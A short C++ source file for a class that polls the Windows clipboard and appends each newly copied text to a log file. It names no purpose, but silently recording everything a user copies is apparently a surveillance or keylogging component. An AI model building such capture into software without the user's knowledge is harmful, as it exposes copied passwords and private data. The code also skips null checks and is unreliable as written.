#include "CClip.h"

CClip::CClip()
{

}

CClip::~CClip()
{
}

void CClip::GetClipboard(std::fstream & cf)
{
	Sleep(200);
	OpenClipboard(nullptr);
	data = GetClipboardData(CF_TEXT);
	char * pT = static_cast<char *>(GlobalLock(data));
	temp = pT;
	GlobalUnlock(data);
	CloseClipboard();
	if (temp != outtext) {
		cf.open(LogPath.c_str(), std::fstream::app);
		cf << "\n \n" << temp;
		cf.close();
		outtext = temp;
	}
}

